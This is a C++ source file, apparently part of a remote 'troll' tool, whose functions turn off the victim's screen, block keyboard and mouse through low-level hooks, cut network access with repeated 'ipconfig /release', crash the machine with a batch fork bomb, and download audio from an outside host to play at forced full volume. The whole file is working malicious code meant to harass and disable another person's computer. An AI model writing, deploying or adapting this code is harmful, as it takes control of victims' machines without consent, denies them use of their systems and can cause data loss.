/*
TROLL:
block entire screen [ok]
block input [ok]
play sound [ok]
turn off internet [ok]
spawn a process which kills the entire computer [ok]
*/

#include <iostream>
#include <windows.h>
#include <iphlpapi.h>
#include <powrprof.h>
#include <fstream>
#include <mmsystem.h>
#include <mmdeviceapi.h>
#include <endpointvolume.h>

#include "file.hpp"
#include "string_functions.hpp"

#pragma once

void BlockScreen(int seconds) {
    for (int i = 0; i != seconds; i++) {
        PostMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2);
        Sleep(1000);
    }
}

LRESULT CALLBACK BlockProc(int _, WPARAM __, LPARAM ___) {
    return 1;
}

void BlockUserInput(int seconds) {
    HHOOK hKeyboard;
    HHOOK hMouse;
    for (int i = 0; i != seconds * 10; i++)
    {
        hKeyboard = SetWindowsHookEx(WH_KEYBOARD_LL, BlockProc, NULL, 0);
        hMouse = SetWindowsHookEx(WH_MOUSE_LL, BlockProc, NULL, 0);
        Sleep(100);
        UnhookWindowsHookEx(hKeyboard);
        UnhookWindowsHookEx(hMouse);
    }
}

void KillInternet(int seconds) {
    for (int i = 0; i != seconds * 10; i++) {
        system("ipconfig /release");
        Sleep(100);
    }
    system("ipconfig /renew");
}

void KillComputer() {
    std::ofstream pWrite("g.bat");
    pWrite << "%0|%0";
    pWrite.close();
    system("g.bat");
}

void PlaySoundFromFile(std::string fileID) {

    // Download audio
    std::string data = GET_Request("http://0x3af72.pythonanywhere.com/serve_temp/?f=" + fileID);
    std::string file = RandomString(16);
    std::ofstream pWrite(file + ".mp3", std::ios::binary);
    WriteLong(pWrite, data);
    pWrite.close();

    // Maximize volume
    CoInitialize(NULL);
    IMMDeviceEnumerator* deviceEnum = NULL;
    IMMDevice* defaultPlaybackDev = NULL;
    IAudioEndpointVolume* endpointVol = NULL;
    CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL, __uuidof(IMMDeviceEnumerator), (void**) &deviceEnum);
    deviceEnum->GetDefaultAudioEndpoint(eRender, eConsole, &defaultPlaybackDev);
    defaultPlaybackDev->Activate(__uuidof(IAudioEndpointVolume), CLSCTX_INPROC_SERVER, NULL, (void**) &endpointVol);
    BOOL muted;
    endpointVol->GetMute(&muted);
    if (muted) {
        endpointVol->SetMute(FALSE, NULL);
    }
    endpointVol->SetMasterVolumeLevelScalar(1.0f, NULL);
    endpointVol->Release();
    defaultPlaybackDev->Release();
    deviceEnum->Release();
    CoUninitialize();

    // Play
    mciSendString(("open " + file + ".mp3 alias " + file).c_str(), NULL, 0, NULL);
    mciSendString(("play " + file).c_str(), NULL, 0, NULL);
    char statusBuffer[128];
    do {
        mciSendString("status sound mode", statusBuffer, sizeof(statusBuffer), NULL);
        Sleep(100);
    } while (strcmp(statusBuffer, "playing") == 0);
    mciSendString(("stop " + file).c_str(), NULL, 0, NULL);
    mciSendString(("play " + file).c_str(), NULL, 0, NULL);
    std::filesystem::remove(file + ".mp3");
}